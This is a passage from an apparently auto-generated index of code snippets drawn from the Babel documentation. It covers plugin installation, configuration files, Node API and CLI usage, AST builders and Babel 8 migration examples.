\"@babel/helper-split-export-declaration\";\n\n// ...\n\ntraverse(file, {\n  ExportDefaultDeclaration(path) {\n    if (!path.get(\"declaration\").isClassDeclaration()) return;\n    splitExportDeclaration(path);\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via Node.js API\nDESCRIPTION: This JavaScript snippet shows how to use the @babel/plugin-transform-unicode-property-regex plugin programmatically via the Node.js API. It requires the @babel/core package and uses the transformSync method to apply the plugin to the provided code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-property-regex.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(code, {\n  plugins: [\"@babel/plugin-transform-unicode-property-regex\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Installing the plugin\nDESCRIPTION: Installs the Babel plugin as a development dependency using npm. This makes the plugin available for use in the project's build process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-safari-id-destructuring-collision-in-function-expression.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-bugfix-safari-id-destructuring-collision-in-function-expression\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Plugin via NPM/Yarn\nDESCRIPTION: Installs the @babel/plugin-syntax-export-default-from plugin as a development dependency using npm or yarn. This command adds the plugin to your project's package.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-export-default-from.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-export-default-from\n```\n\n----------------------------------------\n\nTITLE: Flow Declare Class Field Example JavaScript\nDESCRIPTION: This example shows how to use `declare` keyword to declare type-only class fields. This functionality will be enabled by default in Babel 8.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-flow.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass A {\n  declare foo: string; // Removed\n  bar: string; // Initialized to undefined\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel with Plugin (Recommended)\nDESCRIPTION: Example of configuring Babel to use the `@babel/plugin-proposal-do-expressions` plugin within a `babel.config.json` file.  This is the recommended approach for configuring Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-do-expressions.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-do-expressions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Importing environmentVisitor in Babel Plugin (JS)\nDESCRIPTION: This snippet shows how to import the `environmentVisitor` and `requeueComputedKeyAndDecorators` functions from the `@babel/helper-environment-visitor` package into your Babel plugin.  These imports are necessary to use the helper functions within the plugin's visitor methods.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport environmentVisitor, {\n  requeueComputedKeyAndDecorators\n} from \"@babel/helper-environment-visitor\";\n```\n\n----------------------------------------\n\nTITLE: Declaring Uninitialized Class Fields in Flow\nDESCRIPTION: This snippet shows how to declare uninitialized class fields in Flow using the `declare` keyword. This prevents the fields from being automatically initialized to `undefined`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_18\n\nLANGUAGE: flow\nCODE:\n```\nclass A {\n  foo: string | void; // initialized to undefined\n  declare bar: number; // type-only, will be removed\n}\n```\n\n----------------------------------------\n\nTITLE: Import and Run Test Runner (JavaScript)\nDESCRIPTION: This code snippet demonstrates how to import the @babel/helper-plugin-test-runner and execute it within a test directory. The __dirname variable represents the current directory, which is assumed to contain a /test/fixtures directory with test suites.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-plugin-test-runner.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport runner from \"@babel/helper-plugin-test-runner\";\n\nrunner(__dirname);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: Installs the `@babel/plugin-syntax-destructuring-private` package as a development dependency using npm. This allows the plugin to be used for parsing destructuring private fields.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-destructuring-private.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-destructuring-private\n```\n\n----------------------------------------\n\nTITLE: Nullish vs OR Operator in JavaScript\nDESCRIPTION: This code illustrates the difference between the nullish coalescing operator (`??`) and the logical OR operator (`||`) when dealing with potentially falsy values. The example shows that `??` correctly identifies 0 as a valid value, while `||` incorrectly interprets it as a falsy value and uses the fallback.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-01-11-7.8.0.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst element = { index: 0, value: \"foo\" };\n\nconst index = element.index ?? -1; //  0 :D\nconst index = element.index || -1; // -1 :(\n```\n\n----------------------------------------\n\nTITLE: Object Assign Substitute (JavaScript)\nDESCRIPTION: This snippet shows how to use `Object.assign` as a substitute for object rest spread when both the `loose` and `useBuiltIns` options are enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_19\n\nLANGUAGE: javascript\nCODE:\n```\n// Substitute for Object.assign: [\"proposal-object-rest-spread\", { \"loose\": true, \"useBuiltIns\": true }]\nz = Object.assign(\n  {\n    x,\n  },\n  y\n);\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI\nDESCRIPTION: This shell command shows how to run Babel from the command line and specify the babel-plugin-minify-dead-code-elimination plugin to be used.  The script.js file will be transformed with the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-dead-code-elimination.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-dead-code-elimination script.js\n```\n\n----------------------------------------\n\nTITLE: Unicode Property Regex - JavaScript\nDESCRIPTION: This code snippet demonstrates the use of Unicode property escapes in regular expressions and how Babel transforms them to ES5 or ES6 compatible code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar regex = /\\p{ASCII_Hex_Digit}/u;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar regex = /[0-9A-Fa-f]/;\n```\n\n----------------------------------------\n\nTITLE: Using @babel/preset-stage-1 via CLI\nDESCRIPTION: This command demonstrates how to use the `@babel/preset-stage-1` preset when invoking Babel from the command line. It transforms the `script.js` file using the specified preset. The output will be written to the console or to a specified output file, depending on the Babel CLI configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-1.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nbabel script.js --presets @babel/preset-stage-1\n```\n\n----------------------------------------\n\nTITLE: Valid Decorator Usage JavaScript\nDESCRIPTION: This code illustrates valid decorator usage examples in JavaScript. It showcases decorators with call expressions, decorators on computed methods, decorators on generator functions, decorators with member expressions, and exported decorator classes.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\n// decorators with a call expression\n@foo('bar')\nclass A {\n  // decorators on computed methods\n  @autobind\n  [method](arg) {}\n  // decorators on generator functions\n  @deco\n  *gen() {}\n  // decorators with a member expression\n  @a.b.c(e, f)\n  m() {}\n}\n\n// exported decorator classes\nexport default @foo class {}\n```\n\n----------------------------------------\n\nTITLE: importInterop none example\nDESCRIPTION: Example of `importInterop: \"none\"` option, which omits the `_interopRequireDefault` helper.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport foo from \"foo\";\nimport { bar } from \"bar\";\nfoo;\nbar;\n\n// Is compiled to ...\n\n\"use strict\";\n\nvar _foo = require(\"foo\");\nvar _bar = require(\"bar\");\n\n_foo.default;\n_bar.bar;\n```\n\n----------------------------------------\n\nTITLE: Setting BABEL_DISABLE_CACHE Environment Variable\nDESCRIPTION: This snippet shows how to set the BABEL_DISABLE_CACHE environment variable to disable the Babel cache. Setting this variable to 1 will prevent Babel from caching compiled files.\nSOURCE: https://github.com/babel/website/blob/main/docs/register.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nBABEL_DISABLE_CACHE=1 babel-node script.js\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API (JavaScript)\nDESCRIPTION: Example of using the @babel/plugin-proposal-decorators plugin via the Babel Node API.  It transforms the `code` string using the specified plugin configuration, setting the `version` option to `2023-11`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\n    [\"@babel/plugin-proposal-decorators\", { version: \"2023-11\" }],\n  ]\n});\n```\n\n----------------------------------------\n\nTITLE: Transform Template Literals with Loose Mode (Out)\nDESCRIPTION: This example showcases the output JavaScript code after the template literal has been transformed by the plugin with the `loose` option or the `mutableTemplateObject` assumption enabled, using the `+` operator instead of `concat`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n\"foo\" + bar;\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Executes Babel from the command line, applying the @babel/plugin-transform-function-name plugin to a specified script file. Requires the babel CLI to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-function-name.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-function-name script.js\n```\n\n----------------------------------------\n\nTITLE: Iterators and For...Of Loop in JavaScript\nDESCRIPTION: Shows how to create custom iterators using the `Symbol.iterator` property and how to iterate over them using the `for...of` loop in ES2015. The example demonstrates a Fibonacci sequence iterator. It also includes interfaces in TypeScript for IteratorResult, Iterator and Iterable.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_9\n\nLANGUAGE: TypeScript\nCODE:\n```\ninterface IteratorResult {\n  done: boolean;\n  value: any;\n}\ninterface Iterator {\n  next(): IteratorResult;\n}\ninterface Iterable {\n  [Symbol.iterator](): Iterator\n}\n```\n\n----------------------------------------\n\nTITLE: Class Field Declaration JavaScript\nDESCRIPTION: This JavaScript example shows the effect of the `allowDeclareFields` option.  When enabled, only class fields prefixed with `declare` are removed. Other fields are initialized to undefined.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-strip-types.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass A {\n  declare foo: string; // Removed\n  bar: string; // Initialized to undefined\n}\n```\n\n----------------------------------------\n\nTITLE: JSXOpeningElement TypeParameters Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `typeParameters` to `typeArguments` in JSXOpeningElement.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_29\n\nLANGUAGE: typescript\nCODE:\n```\n<Component<string>/>\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Uses the `@babel/core` package's `transformSync` function to transform code with the `@babel/plugin-syntax-destructuring-private` plugin.  This API allows for programmatic use of the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-destructuring-private.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-destructuring-private\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Checking for Class Node Type with Babel\nDESCRIPTION: Checks if a given AST node is a `Class` node using `t.isClass(node)`. This is an alias covering both `ClassDeclaration` and `ClassExpression` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_257\n\nLANGUAGE: javascript\nCODE:\n```\nt.isClass(node);\n```\n\n----------------------------------------\n\nTITLE: Flow Enum with Unknown Members\nDESCRIPTION: Example of a Flow enum declaration with unknown members. The `...` syntax indicates that the enum may have additional members not explicitly listed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nenum PetKind {\n  Dog,\n  Cat,\n  Snake,\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via NPM Shell\nDESCRIPTION: Command to install the @babel/plugin-proposal-function-bind plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-function-bind\n```\n\n----------------------------------------\n\nTITLE: Installing the Plugin\nDESCRIPTION: Installs the `@babel/plugin-proposal-import-attributes-to-assertions` plugin as a development dependency using npm. This is the first step in using the plugin to transform import attributes into import assertions during the Babel compilation process. It requires npm to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-attributes-to-assertions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-import-attributes-to-assertions\n```\n\n----------------------------------------\n\nTITLE: Installing the React Preset\nDESCRIPTION: Installs the `babel-preset-react` preset as a development dependency using npm. This preset configures Babel to support React's JSX syntax and other React-specific transformations.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install --save-dev babel-preset-react\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-transform-object-super (Shell)\nDESCRIPTION: Command to install the @babel/plugin-transform-object-super plugin using npm. This command adds the plugin as a development dependency to your project. This makes the plugin available for use in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-super.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-object-super\n```\n\n----------------------------------------\n\nTITLE: Using with Node API and '^^' topic token\nDESCRIPTION: This JavaScript code shows how to use the @babel/plugin-syntax-pipeline-operator plugin with the Babel Node API, specifying the '^^' topic token. It uses `require('@babel/core').transformSync` to transform the code string with the plugin configured.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-pipeline-operator.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\n    [ \"@babel/plugin-syntax-pipeline-operator\", { topicToken: \"^^\" } ],\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Preset in package.json\nDESCRIPTION: This JSON snippet configures Babel to use the 'es2015' preset. This preset contains a collection of plugins that transform ES2015 code. The preset is specified within the 'presets' array in the Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-29-6.0.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\"es2015\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Command-line usage example of the Babel CLI to transform a script using the `@babel/plugin-proposal-export-default-from` plugin.  This transforms `script.js` using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-export-default-from.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-export-default-from script.js\n```\n\n----------------------------------------\n\nTITLE: Usage via Node API\nDESCRIPTION: This example shows how to use the plugin via the Babel Node API. The `transformSync` method is used to transform the code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-strict-mode.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-strict-mode\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI (Shell)\nDESCRIPTION: Uses the Babel CLI to transform a JavaScript file with the @babel/plugin-syntax-partial-application plugin. The plugin enables Babel to parse the partial application syntax during the transformation process. It requires the Babel CLI to be installed globally or locally.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-partial-application.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-partial-application script.js\n```\n\n----------------------------------------\n\nTITLE: Copy Files, Ignoring JavaScript\nDESCRIPTION: Copies files from the `src` directory to the `lib` directory, except for ignored JavaScript files.  The `--copy-files` option enables copying non-compiled files, and `--no-copy-ignored` prevents copying ignored JavaScript files.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel src --out-dir lib --copy-files --no-copy-ignored\n```\n\n----------------------------------------\n\nTITLE: Async Do Expressions in Babel 8\nDESCRIPTION: Demonstrates the usage of async do expressions within Babel 8. This allows awaiting asynchronous operations within a do expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nasync do { await requestAPI().json() }\n```\n\n----------------------------------------\n\nTITLE: Declaring bindifyDecorators Function in JavaScript\nDESCRIPTION: This code snippet declares the `bindifyDecorators` function which takes an array of NodePath objects as input. The function's purpose is related to processing decorators in Babel transformations, specifically binding them. The function is exported as the default export of the module.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-bindify-decorators.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ndeclare export default bindifyDecorators(decorators: Array<NodePath>);\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json\nDESCRIPTION: Configures the babel-plugin-minify-flip-comparisons plugin by adding it to the `plugins` array in the `babel.config.json` file. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-flip-comparisons.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-flip-comparisons\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using requeueComputedKeyAndDecorators (JS)\nDESCRIPTION: This snippet illustrates how to use `requeueComputedKeyAndDecorators` to re-queue the computed key and decorators of a class member path. This ensures that they are revisited after the current traversal queue is drained. This is useful in scenarios where the computed key or decorators need to be processed in a specific order relative to the rest of the node's properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nif (path.isMethod()) {\n  requeueComputedKeyAndDecorators(path)\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript const enum Example\nDESCRIPTION: This TypeScript code snippet demonstrates the usage of `const` enums and its compiled output with and without the `optimizeConstEnums` option. It showcases how Babel now ignores the `const` modifier when compiling enums and provides an option for optimized output similar to the default TypeScript compiler.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-07-26-7.15.0.md#_snippet_2\n\nLANGUAGE: TypeScript\nCODE:\n```\n// Input\nconst enum Animals { Dog }\nconsole.log(Animals.Dog);\n\n// Output (default)\nvar Animals;\n(function (Animals) {\n  Animals[Animals[\"Dog\"] = 0] = \"Dog\";\n})(Animals || (Animals = {}));\n\nconsole.log(Animals.Dog);\n\n// Output with `optimizeConstEnums`\nconsole.log(0);\n```\n\n----------------------------------------\n\nTITLE: Transform File via Babel CLI\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transform a JavaScript file using the `@babel/plugin-transform-export-namespace-from` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-export-namespace-from.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-export-namespace-from script.js\n```\n\n----------------------------------------\n\nTITLE: Babel Config with async-do-expressions & async-to-generator\nDESCRIPTION: This JSON configuration file shows how to include both `@babel/plugin-proposal-async-do-expressions` and `@babel/plugin-transform-async-to-generator` plugins in your Babel configuration, used to target older engines like Node.js 6 or IE 11.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-async-do-expressions.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-proposal-async-do-expressions\",\n    \"@babel/plugin-transform-async-to-generator\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using @babel/preset-stage-1 via Node API\nDESCRIPTION: This JavaScript snippet shows how to use the `@babel/preset-stage-1` preset programmatically via the Node API. It uses the `transformSync` function to transform the input `code` string.  The `presets` option specifies the list of presets to use during transformation. This example requires `@babel/core` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-1.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-stage-1\"]\n});\n```\n\n----------------------------------------\n\nTITLE: TSCallSignatureDeclaration AST (Babel 8)\nDESCRIPTION: Babel 8 AST for TSCallSignatureDeclaration, using `params` and `returnType`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_13\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSCallSignatureDeclaration\",\n  \"params\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"retutnType\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TemplateLiteral Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TemplateLiteral` AST node using Babel's `t.templateLiteral` method. It requires an array of `TemplateElement` quasis and an array of expressions.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_227\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.templateLiteral(quasis, expressions);\n```\n\n----------------------------------------\n\nTITLE: Configuring the Plugin (JSON)\nDESCRIPTION: This JSON snippet shows how to configure the @babel/plugin-transform-unicode-sets-regex plugin in a babel.config.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-sets-regex.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-unicode-sets-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Opening Element in JavaScript\nDESCRIPTION: This snippet creates a `JSXOpeningElement` AST node using Babel's `t.jsxOpeningElement` builder. It requires `name` (JSXIdentifier, JSXMemberExpression, or JSXNamespacedName) and `attributes` (array of JSXAttribute or JSXSpreadAttribute).  `selfClosing` is an optional boolean defaulting to false. `typeArguments` and `typeParameters` are optional and excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_103\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxOpeningElement(name, attributes, selfClosing);\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Uses the Babel Node API to transform code with the sticky regex plugin. The `transformSync` method is used to synchronously transform the code.  The `plugins` option specifies the plugins to use.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-sticky-regex.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-sticky-regex\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via NPM\nDESCRIPTION: This command installs the babel-plugin-transform-node-env-inline plugin as a development dependency using npm. This is necessary before using the plugin in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-node-env-inline.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nnpm install babel-plugin-transform-node-env-inline --save-dev\n```\n\n----------------------------------------\n\nTITLE: Using Babel Connect Middleware in JavaScript\nDESCRIPTION: This snippet demonstrates the integration of Babel Connect middleware within a Connect/Express application. It initializes the middleware with options for transforming files from a source directory to a destination cache, subsequently serving the cached files using `connect.static`. This setup allows for on-the-fly transpilation of JavaScript assets. The `babel-connect` package is a dependency.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/connect/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar babelMiddleware = require(\"babel-connect\");\n\napp.use(babelMiddleware({\n  options: {\n    // options to use when transforming files\n  },\n  src: \"assets\",\n  dest: \"cache\"\n}));\n\napp.use(connect.static(\"cache\"));\n```\n\n----------------------------------------\n\nTITLE: TypeScript Compiler Options Configuration\nDESCRIPTION: This JSON snippet presents TypeScript compiler options required for the rewriteImportExtensions Babel feature. Specifically, `allowImportingTsExtensions` is set to `true` to support importing `.ts` extensions and `moduleResolution` should be set to `nodenext`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"compilerOptions\": {\n    \"lib\": [\"esnext\"],\n    \"noEmit\": true,\n    \"isolatedModules\": true,\n    \"moduleResolution\": \"nodenext\",\n    \"allowImportingTsExtensions\": true\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Using metalsmith-babel via API with Babel presets\nDESCRIPTION: This snippet illustrates how to use the metalsmith-babel plugin via the Metalsmith API. It shows how to require the necessary modules, initialize Metalsmith, use the `babel` plugin, and define Babel options such as presets. The expected input is JavaScript files in the source directory. The output is transpiled JavaScript files in the Metalsmith build directory.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/metalsmith/usage.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar Metalsmith = require(\"metalsmith\");\nvar babel = require(\"metalsmith-babel\");\n\nnew Metalsmith(\"./source\")\n  .use(babel({\n    /* babel options */\n    presets: [\"@babel/preset-env\"]\n  }))\n  .build(function(err, files) {\n    if (err) {\n      throw err;\n    }\n\n    console.log(\"Completed.\");\n  });\n```\n\n----------------------------------------\n\nTITLE: Using @babel/helpers Inside a Plugin\nDESCRIPTION: This example shows how to use the .addHelper function within a Babel plugin's visitor to add a helper to the file (if it doesn't already exist) and obtain an expression that references it. It uses the 'typeof' helper and verifies that it is an expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/helpers.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default {\n  visitor: {\n    UnaryExpression(path) {\n      // The .addHelper function adds, if needed, the helper to the file\n      // and returns an expression which references the helper\n      const typeofHelper = this.addHelper(\"typeof\");\n      t.isExpression(typeofHelper); // true\n  }\n};\n```\n\n----------------------------------------\n\nTITLE: Configure Babel with preset-es2015\nDESCRIPTION: Configures Babel to use the @babel/preset-es2015 preset within a babel.config.json file. This configuration tells Babel to transform ES2015 code.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2015.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-es2015\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Undefined to Void Plugin: CLI\nDESCRIPTION: This shell command demonstrates how to use the plugin via the Babel CLI. It transforms `script.js` using the `transform-undefined-to-void` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-undefined-to-void.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-undefined-to-void script.js\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Input Code\nDESCRIPTION: This example shows the input JavaScript code that will be transformed by the plugin. It demonstrates a simple function call.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-strict-mode.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfoo();\n```\n\n----------------------------------------\n\nTITLE: Creating a BooleanLiteralTypeAnnotation Node\nDESCRIPTION: Creates an AST node representing a boolean literal type annotation. Requires the `value` parameter, which is a boolean. Use `t.isBooleanLiteralTypeAnnotation(node, opts)` to check if a node is a BooleanLiteralTypeAnnotation and `t.assertBooleanLiteralTypeAnnotation(node, opts)` to assert that a node is a BooleanLiteralTypeAnnotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.booleanLiteralTypeAnnotation(value);\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/preset-stage-0\nDESCRIPTION: Installs the @babel/preset-stage-0 package as a development dependency using npm. This allows Babel to utilize the preset for transforming code.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-0.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-stage-0\n```\n\n----------------------------------------\n\nTITLE: Get Targets Example JavaScript\nDESCRIPTION: Demonstrates how to use the `getTargets` function to retrieve the default compilation targets and to query targets with ES Module support.  It showcases the output for default targets and for targets configured to support ES modules.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-compilation-targets.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Return the default compilation targets\n// returns {}\ngetTargets();\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n/* returns {\n  \"android\": \"61.0.0\",\n  \"chrome\": \"61.0.0\",\n  \"edge\": \"16.0.0\",\n  \"firefox\": \"60.0.0\",\n  \"ios\": \"10.3.0\",\n  \"node\": \"13.2.0\",\n  \"opera\": \"48.0.0\",\n  \"safari\": \"10.1.0\",\n  \"samsung\": \"8.2.0\",\n} */\ngetTargets({\n  esmodules: true,\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring with '@@' topic token\nDESCRIPTION: This JSON snippet demonstrates how to configure the @babel/plugin-syntax-pipeline-operator plugin in babel.config.json with the '@@' topic token.  The plugin is added to the 'plugins' array, along with an options object specifying the 'topicToken'.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-pipeline-operator.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [ 